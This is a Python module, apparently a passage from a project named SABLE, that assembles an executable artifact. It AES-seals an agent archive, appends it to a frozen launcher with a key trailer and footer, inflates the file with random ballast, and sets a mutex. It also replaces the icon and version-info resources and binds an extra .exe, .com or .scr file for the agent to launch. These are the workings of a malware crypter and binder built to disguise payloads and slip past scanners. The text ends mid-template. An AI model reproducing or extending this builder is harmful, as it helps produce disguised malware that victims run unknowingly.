"""Assemble the shipping artifact: payload, seal, ballast, trailer, footer.

Five things are owned here and nowhere else:

1. The payload archive. ``agent/`` verbatim, ``core/schema.py`` copied in as
   ``sable_schema.py``, and ``cfg.json`` written from the validated ``RunConfig``.
   One archive, one config, one schema, and ``agent/config.py`` reads the copy that
   is inside the file it is running from.
2. The trailer. The seal key and the mutex name must exist before anything is
   decrypted, so they cannot live in ``cfg.json`` â€” that file is inside the archive
   those two unlock. They cannot live in the launcher either, or every build would
   need its own fresh freeze. So both travel in a fixed-width block welded between
   the sealed blob and the footer, and one launcher opens any artifact.
3. The container. ``[ stub ][ ballast ][ sealed ][ trailer 868 ][ footer 12 ]``, with
   the footer last so ``agent/loader.py`` finds the sealed blob with one seek.
4. The two output modes. ``exe`` is the shipping artifact: a frozen launcher with the
   sealed payload welded behind it. ``py`` is the inspectable one: a single runnable
   script carrying the sealed blob as base64, for a machine with an interpreter and
   no frozen launcher. Both run the same ``agent.entry`` and both carry the same key;
   the script mode just spells it out in text instead of hiding it in a binary.
5. The icon. Two build inputs arrive here that are not part of the config: an ``.ico``
   patched into the launcher's resources on the copy being written, and one file welded
   into the payload archive under ``fused/``. Neither belongs in ``cfg.json`` â€” the
   launcher is a file on the build machine, and the bound file has to be inside the
   archive for the agent to ever see it.

The footer is ``b"SBLT"`` and the little-endian 64-bit offset of the sealed blob.
The offset is measured from the start of the file, which is why ballast sits before
the sealed blob rather than after the footer: appending ballast at the end would
push the footer out of position, and the loader would have to scan.
"""

from __future__ import annotations

import base64
import contextlib
import io
import json
import os
import shutil
import struct
import tempfile
import zipfile
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path
from typing import Final, Literal

from .schema import MAX_BALLAST_MB, RunConfig, VersionConfig, to_dict
from .seal import MIN_SEALED_BYTES

OutputMode = Literal["exe", "py"]

OUTPUT_EXE: Final[str] = "exe"
OUTPUT_PY: Final[str] = "py"
OUTPUT_MODES: Final[tuple[str, ...]] = (OUTPUT_EXE, OUTPUT_PY)

FOOTER_MAGIC: Final[bytes] = b"SBLT"
FOOTER_SIZE: Final[int] = 12

# The trailer sits between the sealed blob and the footer and carries the two values a
# launcher needs before it can decrypt anything: the seal key and the mutex name.
#
# Fixed-width slots, so a reader computes the position instead of parsing a length
# prefix, and so a key of any length up to the slot costs the same bytes on disk.
TRAILER_MAGIC: Final[bytes] = b"SBLK"

# The seal key is a passphrase, capped in bytes because the slot is bytes. Twelve
# characters is the floor over in ``core/validate.py``; sixty-four bytes is where a
# PBKDF2 passphrase stops gaining anything and starts costing trailer space.
KEY_SLOT: Final[int] = 64

# A kernel object name is capped at 260 WCHARs. Two hundred leaves room for the
# ``Global\`` prefix and still fails loudly well before the kernel does. Four bytes
# per WCHAR is the widest UTF-8 can get, so the slot holds any name validate accepts.
MUTEX_SLOT: Final[int] = 200 * 4

TRAILER_SIZE: Final[int] = len(TRAILER_MAGIC) + KEY_SLOT + MUTEX_SLOT

SCHEMA_MEMBER: Final[str] = "sable_schema.py"
CONFIG_MEMBER: Final[str] = "cfg.json"

_MIB: Final[int] = 1024 * 1024
_COPY_CHUNK: Final[int] = 1024 * 1024
_OFFSET_BYTES: Final[int] = 8
_EXTENSIONS: Final[dict[str, str]] = {OUTPUT_EXE: ".exe", OUTPUT_PY: ".py"}

# Fixed timestamp on every member so two builds of the same tree produce the same
# payload bytes. The seal is randomised per artifact, so this only makes the zip
# comparable; it is not an attempt at a reproducible binary.
_ZIP_DATE: Final[tuple[int, int, int, int, int, int]] = (1980, 1, 1, 0, 0, 0)

_REQUIRED_MEMBERS: Final[tuple[str, ...]] = (
    "agent/__init__.py",
    "agent/entry.py",
    "agent/loader.py",
)

# --- the icon -----------------------------------------------------------------

# A per-artifact icon is a patch on the copy being written, never a second freeze: one
# launcher opens every build, and freezing per build would undo that. The patch is
# awkward for one reason and the shape below exists for it. The launcher is a one-file
# PyInstaller image â€” a PE image with a package archive welded to its tail â€” and a
# resource update rewrites the image and drops the tail. So the tail is measured before
# the patch and re-appended after it.
_PE_POINTER: Final[int] = 0x3C
_PE_SIGNATURE: Final[bytes] = b"PE\x00\x00"
_PE_COFF_HEADER: Final[int] = 24
_PE_SECTION_ENTRY: Final[int] = 40
_PE_MAX_SECTIONS: Final[int] = 96
_PE_SIZE_OF_HEADERS: Final[int] = 60

_ICO_HEADER: Final[int] = 6
_ICO_ENTRY: Final[int] = 16
_ICO_MAX_IMAGES: Final[int] = 32
MAX_ICON_BYTES: Final[int] = 4 * 1024 * 1024

# RT_ICON and RT_GROUP_ICON, filed under the ids a one-file build already uses. The
# replacement lands on the entry Explorer reads; a group beside it at a fresh id would
# be ignored on some shells and picked over the original on others.
_RT_ICON: Final[int] = 3
_RT_GROUP_ICON: Final[int] = 14
_ICON_FIRST_ID: Final[int] = 1
_GROUP_ID: Final[int] = 1

# --- the bound file -----------------------------------------------------------

# One file welded into the payload archive and started by the agent. The container does
# not change: it is a member under ``fused/`` the same way ``cfg.json`` is a member at
# the root, and the loader hands the same open archive to the entry point either way.
FUSE_PREFIX: Final[str] = "fused/"
MAX_FUSE_BYTES: Final[int] = 64 * 1024 * 1024
# Declared again in ``agent/entry.py``, which ships inside the archive and cannot import
# this module. tests/test_contracts.py pins the two lists to each other.
BOUND_SUFFIXES: Final[frozenset[str]] = frozenset({".exe", ".com", ".scr"})


class ForgeError(RuntimeError):
    """The artifact could not be assembled. Raised, never returned."""


# --- payload ------------------------------------------------------------------


def _agent_members(root: Path) -> list[tuple[str, bytes]]:
    base = root / "agent"
    if not base.is_dir():
        raise ForgeError(f"{base}: agent package not found")

    members: list[tuple[str, bytes]] = []
    for path in sorted(base.rglob("*.py")):
        if "__pycache__" in path.parts:
            continue
        relative = path.relative_to(root).as_posix()
        try:
            members.append((relative, path.read_bytes()))
        except OSError as exc:
            raise ForgeError(f"{path}: cannot read ({exc.strerror})") from exc

    present = {name for name, _ in members}
    for required in _REQUIRED_MEMBERS:
        if required not in present:
            raise ForgeError(f"{required}: required module missing from the payload")
    return members


def _config_bytes(cfg: RunConfig) -> bytes:
    # to_dict is the inverse of the reader the agent will use, so the archive cannot
    # carry a shape that from_dict would reject.
    return json.dumps(to_dict(cfg), indent=2, ensure_ascii=True).encode("utf-8")


# --- the icon -----------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class IconEntry:
    """One image inside an ``.ico``, with the fields the group resource repeats."""

    width: int
    height: int
    colors: int
    planes: int
    bit_count: int
    data: bytes


def image_end(data: bytes) -> int:
    """Where the PE image stops and whatever is welded after it starts.

    ``SizeOfHeaders`` is the floor, then the furthest section end wins. Anything past
    that is not part of the image: for the launcher it is the PyInstaller archive, and a
    resource update would silently drop all of it.
    """
    if len(data) < _PE_POINTER + 4 or data[:2] != b"MZ":
        raise ForgeError("stub is not an executable image")

    pointer = int.from_bytes(data[_PE_POINTER:_PE_POINTER + 4], "little")
    if pointer <= 0 or pointer + _PE_COFF_HEADER > len(data):
        raise ForgeError("stub PE header pointer is outside the file")
    if data[pointer:pointer + 4] != _PE_SIGNATURE:
        raise ForgeError("stub has no PE signature")

    coff = pointer + 4
    sections = int.from_bytes(data[coff + 2:coff + 4], "little")
    optional_size = int.from_bytes(data[coff + 16:coff + 18], "little")
    optional = coff + 20

    if sections <= 0 or sections > _PE_MAX_SECTIONS:
        raise ForgeError(f"stub carries {sections} sections")
    if optional + optional_size > len(data):
        raise ForgeError("stub optional header runs past the file")

    end = int.from_bytes(
        data[optional + _PE_SIZE_OF_HEADERS:optional + _PE_SIZE_OF_HEADERS + 4], "little"
    )
    table = optional + optional_size
    for index in range(sections):
        base = table + index * _PE_SECTION_ENTRY
        if base + _PE_SECTION_ENTRY > len(data):
            raise ForgeError("stub section table runs past the file")
        raw_size = int.from_bytes(data[base + 16:base + 20], "little")
        raw_offset = int.from_bytes(data[base + 20:base + 24], "little")
        end = max(end, raw_offset + raw_size)

    if end <= 0 or end > len(data):
        raise ForgeError(f"stub image ends at {end}, past its {len(data)} bytes")
    return end


# --- the resource table -------------------------------------------------------

# The update cycle owns every resource the build writes. Two rules came out of watching
# it go wrong on a real launcher:
#
# 1. The group id is read from the stub, never assumed. A launcher whose icon lives at
#    id 7 and a patch written at id 1 leaves two groups in the file, and which one the
#    shell draws depends on the shell.
# 2. Stale images are deleted, not left behind. Replacing a seven-image group with a
#    two-image one otherwise leaves five orphan RT_ICON entries that the change-icon
#    dialog still offers and that a group pointing at the wrong id would still render.
#
# Both are cheap here because the table is parsed before the update opens.


@dataclass(frozen=True, slots=True)
class ResourceRef:
    """One resource row: its type, its id and the language it is filed under."""

    kind: int
    identifier: int
    language: int


def _pe_sections(data: bytes) -> tuple[tuple[tuple[int, int, int], ...], int]:
    """``(virtual, size, raw_offset)`` per section, plus the resource directory RVA."""
    pe = int.from_bytes(data[_PE_POINTER:_PE_POINTER + 4], "little")
    if pe <= 0 or pe + _PE_COFF_HEADER > len(data) or data[pe:pe + 4] != _PE_SIGNATURE:
        raise ForgeError("stub is not an executable image")

    coff = pe + 4
    count = int.from_bytes(data[coff + 2:coff + 4], "little")
    optional_size = int.from_bytes(data[coff + 16:coff + 18], "little")
    optional = coff + 20
    if count <= 0 or count > _PE_MAX_SECTIONS or optional + optional_size > len(data):
        raise ForgeError("stub has no usable section table")

    # The data directories start after the fixed part of the optional header, which is
    # 96 bytes for PE32 and 112 for PE32+. Reading the magic is cheaper than assuming.
    magic = int.from_bytes(data[optional:optional + 2], "little")
    directories = optional + (112 if magic == 0x20B else 96)
    resource_rva = int.from_bytes(data[directories + 2 * 8:directories + 2 * 8 + 4], "little")

    table = optional + optional_size
    sections: list[tuple[int, int, int]] = []
    for index in range(count):
        base = table + index * _PE_SECTION_ENTRY
        if base + _PE_SECTION_ENTRY > len(data):
            raise ForgeError("stub section table runs past the file")
        virtual = int.from_bytes(data[base + 12:base + 16], "little")
        size = int.from_bytes(data[base + 8:base + 12], "little")
        raw = int.from_bytes(data[base + 20:base + 24], "little")
        sections.append((virtual, max(size, 1), raw))
    return tuple(sections), resource_rva


def _rva_offset(sections: tuple[tuple[int, int, int], ...], rva: int) -> int:
    for virtual, size, raw in sections:
        if virtual <= rva < virtual + size:
            return raw + (rva - virtual)
    raise ForgeError(f"resource rva {rva:#x} is in no section")


def resource_refs(raw: bytes) -> tuple[ResourceRef, ...]:
    """Every ``(type, id, language)`` row in the stub's resource table.

    A named resource has no integer id and is reported with ``identifier = -1``: the
    update path only ever touches integer rows, and a name is not one of them.
    """
    sections, resource_rva = _pe_sections(raw)
    if resource_rva == 0:
        return ()
    root = _rva_offset(sections, resource_rva)

    def rows(offset: int) -> list[tuple[int, int]]:
        named = int.from_bytes(raw[root + offset + 12:root + offset + 14], "little")
        ident = int.from_bytes(raw[root + offset + 14:root + offset + 16], "little")
        out: list[tuple[int, int]] = []
        for index in range(named + ident):
            entry = root + offset + 16 + index * 8
            name = int.from_bytes(raw[entry:entry + 4], "little")
            target = int.from_bytes(raw[entry + 4:entry + 8], "little")
            out.append((-1 if name & 0x80000000 else name, target))
        return out

    refs: list[ResourceRef] = []
    for kind, kind_target in rows(0):
        for identifier, id_target in rows(kind_target & 0x7FFFFFFF):
            for language, _ in rows(id_target & 0x7FFFFFFF):
                refs.append(ResourceRef(kind, identifier, language))
    return tuple(refs)


def _icon_entries(raw: bytes) -> list[IconEntry]:
    if len(raw) < _ICO_HEADER:
        raise ForgeError("icon is shorter than its own header")

    reserved, kind, count = struct.unpack_from("<HHH", raw, 0)
    if reserved != 0 or kind != 1:
        raise ForgeError("not a .ico: the header is not a single icon library")
    if count == 0:
        raise ForgeError("icon carries no images")
    if count > _ICO_MAX_IMAGES:
        raise ForgeError(f"icon carries {count} images, the ceiling is {_ICO_MAX_IMAGES}")

    table = _ICO_HEADER + count * _ICO_ENTRY
    if table > len(raw):
        raise ForgeError("icon directory runs past the file")

    entries: list[IconEntry] = []
    for index in range(count):
        base = _ICO_HEADER + index * _ICO_ENTRY
        width, height, colors, _, planes, bits, size, offset = struct.unpack_from(
            "<BBBBHHII", raw, base
        )
        if size == 0 or offset < table or offset + size > len(raw):
            raise ForgeError(f"icon image {index} is outside the file")
        entries.append(
            IconEntry(
                width=width,
                height=height,
                colors=colors,
                planes=planes,
                bit_count=bits,
                data=raw[offset:offset + size],
            )
        )
    return entries


def icon_entries(icon: Path) -> list[IconEntry]:
    """Read an ``.ico``. Raises ``ForgeError`` for anything that is not one."""
    try:
        size = icon.stat().st_size
    except OSError as exc:
        raise ForgeError(f"{icon}: cannot stat ({exc.strerror})") from exc
    if size <= 0:
        raise ForgeError(f"{icon}: is empty")
    if size > MAX_ICON_BYTES:
        raise ForgeError(f"{icon}: {size} bytes, the ceiling is {MAX_ICON_BYTES}")

    try:
        raw = icon.read_bytes()
    except OSError as exc:
        raise ForgeError(f"{icon}: cannot read ({exc.strerror})") from exc
    return _icon_entries(raw)


def group_payload(entries: list[IconEntry]) -> bytes:
    """The ``RT_GROUP_ICON`` body: one row per image, naming the id it was filed under."""
    body = bytearray(struct.pack("<HHH", 0, 1, len(entries)))
    for index, entry in enumerate(entries):
        body += struct.pack(
            "<BBBBHHIH",
            entry.width,
            entry.height,
            entry.colors,
            0,
            entry.planes,
            entry.bit_count,
            len(entry.data),
            _ICON_FIRST_ID + index,
        )
    return bytes(body)


# --- the version resource -----------------------------------------------------

# RT_VERSION is one resource, id 1, and it is what Explorer shows on the properties
# sheet. The body is a tree of length-prefixed, 4-aligned blocks; every size below is
# counted from the start of the block that holds it, which is the detail that makes a
# hand-built blob load or silently not load.
_RT_VERSION: Final[int] = 16
_VERSION_ID: Final[int] = 1
_VERSION_KEY: Final[str] = "VS_VERSION_INFO"
# en-US, Unicode. The code page is the second half and 04B0 is "Unicode" rather than a
# real code page, which is what every string in the tree is encoded as.
_STRING_TABLE: Final[str] = "040904B0"
_LANGUAGE: Final[int] = 0x0409
_CODE_PAGE: Final[int] = 0x04B0
_VERSION_NODE_HEADER: Final[int] = 6
_FIXED_SIGNATURE: Final[int] = 0xFEEF04BD
_FIXED_STRUCTURE: Final[int] = 0x00010000
_FIXED_FLAGS_MASK: Final[int] = 0x3F
_FILE_OS_NT: Final[int] = 0x00040004
_FILE_TYPE_APP: Final[int] = 0x00000001
# A version block that is larger than this is a paste accident, not a disguise.
MAX_VERSION_BYTES: Final[int] = 8 * 1024


def _pad4(size: int) -> int:
    return (4 - size % 4) % 4


def _version_node(
    key: str,
    *,
    value: bytes = b"",
    value_length: int = 0,
    value_type: int = 0,
    children: bytes = b"",
) -> bytes:
    """One block of the version tree, aligned relative to its own start."""
    body = (key + "\0").encode("utf-16le")
    body += b"\0" * _pad4(_VERSION_NODE_HEADER + len(body))
    body += value
    body += b"\0" * _pad4(_VERSION_NODE_HEADER + len(body))
    body += children
    body += b"\0" * _pad4(_VERSION_NODE_HEADER + len(body))
    length = _VERSION_NODE_HEADER + len(body)
    return struct.pack("<HHH", length, value_length, value_type) + body


def version_parts(text: str) -> tuple[int, int]:
    """``1.2.3.4`` as the two 32-bit halves ``VS_FIXEDFILEINFO`` stores."""
    pieces = text.split(".")
    if len(pieces) != 4:
        raise ForgeError(f"{text!r}: a version is four numbers, a.b.c.d")
    numbers: list[int] = []
    for piece in pieces:
        if not piece.isdigit():
            raise ForgeError(f"{text!r}: {piece!r} is not a number")
        value = int(piece)
        if value > 0xFFFF:
            raise ForgeError(f"{text!r}: {value} does not fit in 16 bits")
        numbers.append(value)
    return (numbers[0] << 16) | numbers[1], (numbers[2] << 16) | numbers[3]


def _fixed_file_info(file_version: tuple[int, int], product_version: tuple[int, int]) -> bytes:
    return struct.pack(
        "<13I",
        _FIXED_SIGNATURE,
        _FIXED_STRUCTURE,
        file_version[0],
        file_version[1],
        product_version[0],
        product_version[1],
        _FIXED_FLAGS_MASK,
        0,
        _FILE_OS_NT,
        _FILE_TYPE_APP,
        0,
        0,
        0,
    )


def _version_string(name: str, value: str) -> bytes:
    if not value:
        return b""
    encoded = (value + "\0").encode("utf-16le")
    # wValueLength for a text block counts characters, not bytes. Counting bytes here
    # produces a block that loads and shows every other letter.
    return _version_node(name, value=encoded, value_length=len(value) + 1, value_type=1)


def version_blob(info: VersionConfig) -> bytes:
    """The ``RT_VERSION`` body for ``info``. Empty when nothing was asked for."""
    fields = (
        ("CompanyName", info.company),
        ("FileDescription", info.description),
        ("ProductName", info.product),
        ("LegalCopyright", info.copyright),
        ("OriginalFilename", info.original_name),
        ("FileVersion", info.file_version),
        ("ProductVersion", info.product_version or info.file_version),
    )
    if not any(value for _name, value in fields):
        return b""

    strings = b"".join(_version_string(name, value) for name, value in fields)
    file_version = version_parts(info.file_version or "1.0.0.0")
    product_version = version_parts(info.product_version or info.file_version or "1.0.0.0")

    table = _version_node(_STRING_TABLE, value_type=1, children=strings)
    string_info = _version_node("StringFileInfo", value_type=1, children=table)
    translation = _version_node(
        "Translation",
        value=struct.pack("<HH", _LANGUAGE, _CODE_PAGE),
        value_length=4,
        value_type=0,
    )
    variable_info = _version_node("VarFileInfo", value_type=1, children=translation)
    fixed = _fixed_file_info(file_version, product_version)

    blob = _version_node(
        _VERSION_KEY,
        value=fixed,
        value_length=len(fixed),
        value_type=0,
        children=string_info + variable_info,
    )
    if len(blob) > MAX_VERSION_BYTES:
        raise ForgeError(f"version block is {len(blob)} bytes, the ceiling is {MAX_VERSION_BYTES}")
    return blob


# --- the update cycle ---------------------------------------------------------


def patch_resources(
    stub: Path,
    *,
    icons: list[IconEntry] | None = None,
    version: bytes | None = None,
) -> bytes:
    """The stub's image with its resources replaced and its overlay put back.

    One ``BeginUpdateResource``/``EndUpdateResource`` cycle for everything the build
    writes, because a second cycle would rewrite the image again and re-appending the
    launcher's archive twice is how an artifact ends up with two tails.

    Windows-only, and the DLL is loaded inside the function so this module still imports
    on a machine without ``kernel32``. The Linux import test is a real test.
    """
    if icons is None and version is None:
        raise ForgeError("nothing to patch")
    if icons is not None and not icons:
        raise ForgeError("icon carries no images")
    if os.name != "nt":
        raise ForgeError("resource replacement needs Windows")

    import ctypes
    from ctypes import wintypes

    try:
        raw = stub.read_bytes()
    except OSError as exc:
        raise ForgeError(f"{stub}: cannot read ({exc.strerror})") from exc

    end = image_end(raw)
    overlay = raw[end:]
    refs = resource_refs(raw[:end])

    groups = [ref for ref in refs if ref.kind == _RT_GROUP_ICON and ref.identifier >= 0]
    # The stub's own group id, not an assumption. A launcher that files its icon at 7
    # and a patch written at 1 leaves two groups, and the shell picks.
    group_id = min((ref.identifier for ref in groups), default=_GROUP_ID)
    icon_language = groups[0].language if groups else 0
    versions = [ref for ref in refs if ref.kind == _RT_VERSION and ref.identifier >= 0]
    version_language = versions[0].language if versions else 0

    doomed: list[ResourceRef] = []
    if icons is not None:
        # Every existing image and group goes, including ids past the new image count.
        # They are what a replacement icon "did not fully take" looks like: the shell
        # draws from the group, but the change-icon dialog and some thumbnailers still
        # offer the orphans.
        doomed += [
            ref
            for ref in refs
            if ref.kind in (_RT_ICON, _RT_GROUP_ICON) and ref.identifier >= 0
        ]
    if version is not None:
        doomed += versions

    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    kernel32.BeginUpdateResourceW.argtypes = [wintypes.LPCWSTR, wintypes.BOOL]
    kernel32.BeginUpdateResourceW.restype = wintypes.HANDLE
    kernel32.UpdateResourceW.argtypes = [
        wintypes.HANDLE,
        wintypes.LPVOID,
        wintypes.LPVOID,
        wintypes.WORD,
        wintypes.LPVOID,
        wintypes.DWORD,
    ]
    kernel32.UpdateResourceW.restype = wintypes.BOOL
    kernel32.EndUpdateResourceW.argtypes = [wintypes.HANDLE, wintypes.BOOL]
    kernel32.EndUpdateResourceW.restype = wintypes.BOOL

    handle, name = tempfile.mkstemp(prefix="sable-res-", suffix=".exe")
    os.close(handle)
    image = Path(name)

    try:
        image.write_bytes(raw[:end])
        update = kernel32.BeginUpdateResourceW(str(image), False)
        if not update:
            raise ForgeError(
                f"{stub}: resources could not be opened ({ctypes.get_last_error()})"
            )

        # Every buffer is kept alive until the update commits: ctypes does not own the
        # memory it is handed, and the resource call reads it after the call returns.
        kept: list[object] = []
        committed = True

        for ref in doomed:
            # ``UpdateResource`` with no data and no size is the documented delete. It is
            # used instead of ``DeleteResourceW`` because that export is not in every
            # kernel32 (it is absent from the one this build runs against), and a resource
            # API that is missing at runtime is a build that fails on somebody else's box.
            #
            # A refusal here is not fatal on its own: the write below lands on the same
            # type/id/language and replaces it. The verification after the commit is what
            # decides whether the table actually settled.
            kernel32.UpdateResourceW(
                update,
                ctypes.c_void_p(ref.kind),
                ctypes.c_void_p(ref.identifier),
                ref.language,
                None,
                0,
            )

        def put(kind: int, identifier: int, payload: bytes, language: int) -> None:
            nonlocal committed
            buffer = ctypes.create_string_buffer(payload, len(payload))
            kept.append(buffer)
            committed = bool(
                kernel32.UpdateResourceW(
                    update,
                    ctypes.c_void_p(kind),
                    ctypes.c_void_p(identifier),
                    language,
                    ctypes.cast(buffer, ctypes.c_void_p),
                    len(payload),
                )
            ) and committed

        if icons is not None:
            for index, entry in enumerate(icons):
                put(_RT_ICON, _ICON_FIRST_ID + index, entry.data, icon_language)
            put(_RT_GROUP_ICON, group_id, group_payload(icons), icon_language)
        if version is not None:
            put(_RT_VERSION, _VERSION_ID, version, version_language)

        # Discard on failure: a half-written resource table is not an image worth
        # keeping, and the staging file is thrown away either way.
        if not kernel32.EndUpdateResourceW(update, not committed):
            raise ForgeError(
                f"{stub}: resources did not commit ({ctypes.get_last_error()})"
            )
        if not committed:
            raise ForgeError(f"{stub}: the resource update was refused")

        patched = image.read_bytes()
    finally:
        _discard(image)

    # The image grows, so its new end is measured rather than assumed.
    settled = patched[:image_end(patched)]

    # Verified against the file that was just written, not against the calls that wrote
    # it: an update that returns success and lands the row in a language nothing reads
    # is exactly the failure this build shipped with.
    after = resource_refs(settled)
    if icons is not None:
        images = {ref.identifier for ref in after if ref.kind == _RT_ICON}
        expected = set(range(_ICON_FIRST_ID, _ICON_FIRST_ID + len(icons)))
        if images != expected:
            raise ForgeError(f"{stub}: icon table holds {sorted(images)}, wanted {sorted(expected)}")
        drawn = {ref.identifier for ref in after if ref.kind == _RT_GROUP_ICON}
        if drawn != {group_id}:
            raise ForgeError(f"{stub}: group icons are {sorted(drawn)}, wanted [{group_id}]")
    if version is not None and not any(ref.kind == _RT_VERSION for ref in after):
        raise ForgeError(f"{stub}: the version block did not settle")

    return settled + overlay


def patch_icon(stub: Path, entries: list[IconEntry]) -> bytes:
    """The stub's image with its icons replaced. Icon-only builds go through here."""
    return patch_resources(stub, icons=entries)


@contextlib.contextmanager
def _patched_stub(
    stub: Path,
    *,
    icon: Path | None = None,
    version: VersionConfig | None = None,
) -> Iterator[Path]:
    """A staging copy of the launcher carrying the build's resources."""
    entries = icon_entries(icon) if icon is not None else None
    blob = version_blob(version) if version is not None else None
    if entries is None and not blob:
        yield stub
        return

    patched = patch_resources(
        stub,
        icons=entries,
        version=blob or None,
    )
    handle, name = tempfile.mkstemp(prefix="sable-stub-", suffix=".exe")
    os.close(handle)
    target = Path(name)
    try:
        target.write_bytes(patched)
        yield target
    finally:
        _discard(target)


# --- the bound file -----------------------------------------------------------


def _fuse_member(fuse: Path) -> tuple[str, bytes]:
    """One archive member, named after the file, under the loader's bind prefix."""
    try:
        size = fuse.stat().st_size
    except OSError as exc:
        raise ForgeError(f"{fuse}: cannot stat ({exc.strerror})") from exc
    if size <= 0:
        raise ForgeError(f"{fuse}: is empty")
    if size > MAX_FUSE_BYTES:
        raise ForgeError(f"{fuse}: {size} bytes, the ceiling is {MAX_FUSE_BYTES}")

    name = fuse.name
    if not name or name in (".", "..") or any(character in name for character in '<>:"|?*\\/'):
        raise ForgeError(f"{fuse}: that name cannot travel in an archive")

    try:
        data = fuse.read_bytes()
    except OSError as exc:
        raise ForgeError(f"{fuse}: cannot read ({exc.strerror})") from exc
    return FUSE_PREFIX + name, data


def payload(root: Path, cfg: RunConfig, *, fuse: Path | None = None) -> bytes:
    """The decrypted archive: agent tree, shipped schema, cfg.json, bound file.

    The tree is shipped verbatim. Nothing is rewritten on the way in: the two values
    that used to be patched into ``agent/loader.py`` now travel in the trailer, so the
    source in the archive is byte-identical to the source on disk and a build cannot
    mutate the repository it was run from.

    ``fuse`` is one file welded in under ``FUSE_PREFIX``. It is a build input like the
    launcher, so it never reaches ``cfg.json``: the archive is the whole carrier, and a
    member is cheaper than a schema field the agent would have to read a path out of.
    """
    schema_path = root / "core" / "schema.py"
    try:
        schema = schema_path.read_bytes()
    except OSError as exc:
        raise ForgeError(f"{schema_path}: cannot read ({exc.strerror})") from exc

    members: list[tuple[str, bytes]] = _agent_members(root)
    members.append((SCHEMA_MEMBER, schema))
    members.append((CONFIG_MEMBER, _config_bytes(cfg)))
    if fuse is not None:
        members.append(_fuse_member(fuse))
    members.sort(key=lambda item: item[0])

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, data in members:
            info = zipfile.ZipInfo(name, date_time=_ZIP_DATE)
            info.compress_type = zipfile.ZIP_DEFLATED
            info.external_attr = 0o644 << 16
            archive.writestr(info, data)
    return buffer.getvalue()


# --- container ----------------------------------------------------------------


def _ballast(megabytes: int) -> int:
    if megabytes < 0 or megabytes > MAX_BALLAST_MB:
        raise ForgeError(f"ballast_mb {megabytes} is outside 0..{MAX_BALLAST_MB}")
    return megabytes


def expected_offset(stub_size: int, ballast_mb: int) -> int:
    """Where the sealed blob starts, and therefore what the footer records."""
    if stub_size <= 0:
        raise ForgeError(f"stub is {stub_size} bytes")
    return stub_size + _ballast(ballast_mb) * _MIB


def _slot(text: str, width: int, name: str) -> bytes:
    """One NUL-padded fixed-width slot. Length is position, not a prefix."""
    encoded = text.encode("utf-8")
    if not text.strip():
        # Whitespace-only would encrypt fine and produce a mutex nobody can name and a
        # key nobody can retype. validate rejects it; the write path must agree.
        raise ForgeError(f"{name} is empty")
    if b"\x00" in encoded:
        raise ForgeError(f"{name} contains a NUL byte")
    if len(encoded) > width:
        raise ForgeError(f"{name} is {len(encoded)} bytes, the container carries {width}")
    return encoded.ljust(width, b"\x00")


def trailer(cfg: RunConfig) -> bytes:
    """The bytes a launcher reads before it can decrypt anything."""
    return (
        TRAILER_MAGIC
        + _slot(cfg.seal_key, KEY_SLOT, "seal key")
        + _slot(cfg.mutex, MUTEX_SLOT, "mutex")
    )


def _write_ballast(handle: object, megabytes: int) -> None:
    # Streamed in chunks: ballast_mb can legitimately reach 4096, and holding that
    # as one bytes object would fail before it finished allocating.
    remaining = _ballast(megabytes) * _MIB
    while remaining:
        chunk = min(remaining, _COPY_CHUNK)
        handle.write(os.urandom(chunk))  # type: ignore[attr-defined]
        remaining -= chunk


def _write_exe(
    destination: Path, stub: Path, sealed: bytes, ballast_mb: int, cfg: RunConfig
) -> Path:
    try:
        stub_size = stub.stat().st_size
    except OSError as exc:
        raise ForgeError(f"{stub}: cannot stat ({exc.strerror})") from exc
    if stub_size <= 0:
        raise ForgeError(f"{stub}: stub is empty")

    offset = expected_offset(stub_size, ballast_mb)
    block = trailer(cfg)
    staging = destination.with_name(destination.name + ".part")

    try:
        destination.parent.mkdir(parents=True, exist_ok=True)
        with staging.open("wb") as handle:
            with stub.open("rb") as source:
                shutil.copyfileobj(source, handle, _COPY_CHUNK)
            _write_ballast(handle, ballast_mb)
            handle.write(sealed)
            handle.write(block)
            handle.write(FOOTER_MAGIC + offset.to_bytes(_OFFSET_BYTES, "little"))
        # Same directory, so a half-written artifact is never visible under the
        # shipping name.
        os.replace(staging, destination)
    except OSError as exc:
        # A failed write leaves a full-size ``.part`` in the output folder. Nothing
        # will ever look at it again, and at 4 GB of ballast it is the largest file
        # the folder will hold.
        _discard(staging)
        raise ForgeError(f"{destination}: cannot write ({exc.strerror})") from exc

    return destination


def _write_script(destination: Path, sealed: bytes, cfg: RunConfig) -> Path:
    text = script_text(sealed, cfg.seal_key, cfg.mutex)
    staging = destination.with_name(destination.name + ".part")

    try:
        destination.parent.mkdir(parents=True, exist_ok=True)
        with staging.open("w", encoding="utf-8", newline="\n") as handle:
            handle.write(text)
        os.replace(staging, destination)
    except OSError as exc:
        _discard(staging)
        raise ForgeError(f"{destination}: cannot write ({exc.strerror})") from exc

    return destination


def _discard(path: Path) -> None:
    """Remove a staging file. Cleanup that fails is not worth a second exception."""
    try:
        path.unlink(missing_ok=True)
    except OSError:
        return


_SCRIPT_TEMPLATE: Final[str] = '''#!/usr/bin/env python3
"""SABLE payload script.

Generated by core/forge.py. The archive is sealed with AES-256-GCM under a key
derived from the literal below. The frozen container carries the same two values in
a trailer behind the sealed blob; a text file has nowhere to put one, so they are
spelled out here instead. Running this file takes the mutex, decrypts to a temporary
directory, hands the archive to the loader, and runs the entry point the launcher runs.
"""

from __future__ import annotations

import base64
import shutil
import sys
import tempfile
import zipfile
from pathlib import Path

MUTEX = {mutex}
SEAL_KEY = {key}
SEALED = base64.b64decode({blob})

SALT_SIZE = 16
NONCE_SIZE = 12
TAG_SIZE = 16
KEY_BYTES = 32
KDF_ITERATIONS = 200_000


def _open_sealed(blob: bytes) -> bytes:
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    from Crypto.Protocol.KDF import PBKDF2

    minimum = SALT_SIZE + NONCE_SIZE + TAG_SIZE + 1
    if len(blob) < minimum:
        raise SystemExit(f"sealed payload is {{len(blob)}} bytes, needs {{minimum}}")

    salt = blob[:SALT_SIZE]
    nonce = blob[SALT_SIZE:SALT_SIZE + NONCE_SIZE]
    tag = blob[-TAG_SIZE:]
    ciphertext = blob[SALT_SIZE + NONCE_SIZE:-TAG_SIZE]

    key = PBKDF2(
        SEAL_KEY.encode("utf-8"),
